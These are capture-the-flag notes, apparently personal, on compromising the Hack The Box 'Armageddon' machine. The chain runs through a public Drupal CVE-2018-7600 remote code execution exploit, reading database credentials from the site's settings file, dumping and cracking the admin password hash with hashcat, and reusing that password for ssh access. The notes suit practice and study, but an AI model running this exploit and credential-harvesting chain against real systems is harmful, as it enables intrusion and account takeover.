* Know the specific version of drupal (7.56), try looking for an exploit
* After one google, find this github repo
![[Pasted image 20210607155939.png]]
* Try running this exploit to see we have code execution
```bash
┌──(hunter㉿kali)-[~/htb/armageddon]
└─$ ./exploit.py -c ls http://10.10.10.233

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-tzFIg-hV6el0hgOAjIXth4RoH7y5p-L-VvgYzJVIahk
[*] Triggering exploit to execute: ls
CHANGELOG.txt
COPYRIGHT.txt
INSTALL.mysql.txt
INSTALL.pgsql.txt
INSTALL.sqlite.txt
INSTALL.txt
LICENSE.txt
MAINTAINERS.txt
README.txt
UPGRADE.txt
authorize.php
cron.php
includes
index.php
install.php
misc
modules
nc
php-reverse-shell.php
profiles
robots.txt
scripts
sites
test
test.php
themes
update.php
web.config
xmlrpc.php 
```
* Found in drupal settings file
```sql
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```
* Using this webshell is aids so try and get a better one
![[Pasted image 20210607171006.png]]
* Note that this box doesn't allow connections on higher/less-used ports like 9001
	* Port 80 is the first one I could get a callback on

* Nothing super obvious from running sudo -l or groups, so look for recently edited files
* Don't find anything outside of web directory that we can use

## MySQL
```sql
sh-4.2$ mysql -u drupaluser -p -e 'use drupal; select * from users'
mysql -u drupaluser -p -e 'use drupal; select * from users'
Enter password: CQHEy@9M*m23gBVj
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
0                                               NULL    0       0       0       0       NULL            0               NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   1606998756      1607077194      1607076276      1       Europe/London           0       admin@armageddon.eu     a:1:{s:7:"overlay";i:1;}
3       pwn     $S$DCkpLfGXgWjxMLQ7RJAhVpK2tzngNNfASKtZ4VPrtm/ifLsKIE2u pwn@localhost.localdomain                       filtered_html   1624379697      0       0       0       Europe/London           0       pwn@localhost.localdomain       NULL
```
* Using the creds that we found in the drupal config file, dump a hash for brucetherealadmin
	* This is also a user on the box, so assuming password reuse?
	* Note pwn is a user I created earlier on as a way of testing vulnerabilities on the box
* Using hashcat, easily crack the hash and get password 
```bash
hunter@kali ~/htb/armageddon$ hashcat -m 7900 hash /usr/share/wordlists/rockyou.txt --show
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
```
* Try logging into the box through ssh with this password for brucetherealadmin
```bash
hunter@kali ~/htb/armageddon$ ssh brucetherealadmin@10.10.10.233
brucetherealadmin@10.10.10.233's password:
Last failed login: Tue Jun 22 17:05:04 BST 2021 from 10.10.14.8 on ssh:notty
There were 3 failed login attempts since the last successful login.
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
[brucetherealadmin@armageddon ~]$ id
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[brucetherealadmin@armageddon ~]$
```
* Check ~ and get the user.txt flag